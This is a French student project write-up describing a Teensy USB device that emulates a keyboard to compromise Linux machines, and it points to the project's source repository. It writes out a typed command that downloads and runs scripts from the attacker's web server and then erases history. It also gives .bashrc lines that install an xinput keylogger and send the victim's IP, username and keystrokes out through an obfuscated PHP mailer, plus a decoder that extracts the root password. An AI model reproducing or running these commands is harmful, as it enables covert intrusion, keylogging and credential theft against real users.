
                                               ==[ESL - Projet G0]==

                     |=-----------------------------------------------------------------------=|
                     |=-------------------=[ Ghost Writer Teensy Eploit ]=--------------------=|
                     |=------------------=[ pouyet_j - krier_g - ferrer_y ]=------------------=|
                     |=-----------------------------------------------------------------------=|

Sommaire :
----------

I.   Introduction

II.  Prérequis
       1. Teensy
       2. Serveur web
       3. Repo git

III. Réalisation
       1. Ghost writer
       2. Backdoor
       3. Mailer
       4. Decoder

VI.  Conclusion



I. Introduction :
-----------------

C'est en remarquant qu'avec un peu de social engineering nous arrivions à connecter une clef usb sur une machine,
sans que l'utilisateur ne se soucis de rien, que nous avons eu l'idée de réaliser une attaque sur un port usb.
L'originalité de notre projet étant d'utiliser une clef usb afin d'émuler un clavier dans le but de véroler
l'ordinateur victime, comme s'il le faisait de lui même et cela preque instantanément.
Pour cela une clef usb nommé USB Rubber Ducky existe déjà. Cette clef usb exécute une suite de commandes en les tappant
comme si c'était un clavier, de manière très rapide.
Ce vecteur d'attaque permet de réaliser des actions sur un ordinateur lorsque l'on a accès à une machine non verrouillée.
Dès lors, nous avons décidé d'acheter le matèriel nécessaire pour reproduire ce type de clef usb afin de mettre en place
une attaque aboutissant à l'optention d'un shell root, sur la machine victime. 



II. Prérequis :
---------------

L'attaque décrite dans cet article nécessite l'utilisation d'une Teensy,
d'un serveur web et des codes sources disponible sur http://github.com/kashimsax/TeensyExploit.git
L'ensemble du matériel utilisé nous a coûté seulement une 20ène d'euro.

     1. La Teensy :
     --------------

     La Teensy est tout simplement un micro-controleur doté d'un port USB (cf: https://www.pjrc.com/teensy/).
     Lors du branchement, grâce à des bibliothèques, la Teensy possède la particularité d'émuler le protocole
     de connexion de certains périphériques USB.
     Pour les besoins de notre projet, nous avons choisis de faire passer notre Teensy pour un clavier.
     Cela nous permet ensuite de simuler l'écriture d'un texte par l'utilisateur de façon automatisé.

     2. Le serveur web :
     -------------------

     Au cours de ce projet est apparu la nécessité de récupérer des scripts à distance.
     Pour ce faire, nous avons utilisé un serveur web gratuit. De cette manière nous pouvons télécharger nos
     fichiers grâce à la commande `wget`.
     De plus, cela nous permet de mettre en place un client mail pour recevoir les informations des victimes.
     Nous ne traîterons pas la question de l'anonymat dans cet article, celui-ci étant fait pour démontrer
     la possibilité d'obtenir un shell root au travers de la Teensy.
     Elle reste cependant une part importante de l'attaque si vous souhaitez la réaliser en condition réelle.

     3. Repo git :
     -------------

     Sur le repo git se trouve l'ensemble des sources du projet.
     Le dossier TeensySoft contient la librairie émulant le clavier grâce à la Teensy, mais également les lignes
     de commande à executer lors de la connexion du périphérique (ghostkeyboard.c).
     Vous trouverez également les répertoires shAppend et phpMailer contenant respectivement un script shell 
     initialisant une backdoor ainsi qu'un script php pour l'envoie des données.
     Pour finir, le répertoire LogDecoder contient un programme C++ de convertion de données utilisateurs en texte 
     compréhensible.
     

III. Réalisation :
------------------

       Le projet se décompose en quatre grandes parties allant du social engineering jusqu'à la récupération du mot
       de passe root.

       1. Ghost writer :
       -----------------

       Cette partie concerne uniquement la Teensy. Suite au branchement du périphérique USB sur la machine cible, celui
       va se mettre à exécuter une suite d'instructions.
       
       Tout d'abord il faut savoir que la libraire keyboard de la Teensy nous permet de ne faire que deux actions.
       La première est la simulation de l'appuie d'une touche :
       
              usb_keyboard_press(KEY_A, 0); // Ecris la lettre A
       
       Et la seconde est de simuler un appuie long sur certaine touche :
       
              keyboard_modifier_keys = KEY_CTRL; // Appui long sur la touche CTRL
              usb_keyboard_send();                      
       
       En combinant ces deux fonctionnalitées, nous avons pu ouvrir un terminal grâce à la combinaisons
       des touches (CTRL + ALT + T) et ainsi d'avoir le focus sur celui-ci.
       Dans un second temps, nous convertissons une chaine de caractères en une suite d'évenements clavier
       représentant en réalité une suite de commandes shell :
       
              static const char hack_me[] =
                     "wget -q [URL_SERVEUR]/.profilebash [URL_SERVEUR]/a;chmod 755 a;./a;rm a;history -c;exit";
       
       Une fois executé, cette suite de commande téléchargera les scripts 'a' et '.profilebash', 
       exécutera le script 'a', le supprimera et finira par fermer le terminal.
       A partir de ce moment, la machine cible est verolé.

       Vous aurez certainement remarqué que la nommage des scripts (a et .profilebash) est peu explicite.
       Les raisons sont simples. Dans le premier cas, script 'a', l'explication est que tous les caractères 
       tappés par la teensy seront affichés à l'écran. Il est donc nécessaire de condenser 
       au maximum ces instructions afin de diminuer le temps de frappe et ainsi dissimuler au mieux l'attaque.
       La ligne de commande contenant le nom des scripts, réduire sa taille nous a permis de réduire
       le temps d'affichage du terminal.
       Dans le second cas, .profilebash, nous avons choisis ce nom pour tenter de le dissimuler au mieux à
       l'utilisateur. En effet, contrairement au script 'a', '.profilebash' ne sera pas supprimé.
       
       2. Backdoor :
       -------------

       Cette partie concerne l'exécution du script 'a' signifiant 'append'. En effet, une fois ce script téléchargé par
       la Teensy il est executé puis supprimé.
       Ce script aura uniquement pour tâche d'ajouter une suite d'instruction dans le .bashrc de la victime.
       Le fichier .bashrc éxécutera désormais les instructions suivantes:
       
              ifconfig >> ~/.kernel_config                                          # Récupération de l'ip dans le fichier .kernel_config.
              php ~/.profilebash ~/.kernel_config $USER                             # Envoi des données de la victime sur notre serveur (cf: Mailer).
              rm ~/.kernel_config                                                   
              clear
              FD=`xinput --list | grep -F "Set 2 keyboard" | grep -oE "[0-9]{2}"`   # Récupération de l'id du prériphérique clavier.
              xinput test $FD >> ~/.kernel_config &                                 # Lancement d'un keylogger système.
       
       Le fait de le mettre ces lignes de commandes dans le .bashrc nous permet de récupérer toutes les entrées clavier
       pour les stocker, et par la suite les envoyer sur notre serveur.
       

       3. Mailer :
       -----------
       
       Notre mailer est le fichier .profilebash. En plus de son nom camouflé, nous avons obfusqué son code 
       source pour évoquer le moins de doute possible chez la victime.
       Le Mailer consiste en un simple code PHP qui nous envoie l'ip de la victime, son nom d'utilisateur
       ainsi que toutes ces frappes sur un terminal.
       La finalité étant d'obtenir son mot de passe root qui, combiné à l'ip, nous permettra une connexion
       ssh en root sur la machine cible.
       
       4. Decoder :
       ------------

       Cette dernière partie concerne le traitement des évènements clavier de la victime précédement reçu.
       Puisque nous utilisons le keylogger xinput, nous recevons des données de cette forme :
       
              key press   54 
              key press   24 
              key press   28 
              
       Il nous faut alors convertir ces nombres en texte compréhensible. Pour ce faire, nous avons développé un
       petit outil C++ faisant la conversion. Ce programme cherchera le mot clé "sudo" et ainsi nous afficher en
       clair le mot de passe root.

VI. Conclusion :
----------------
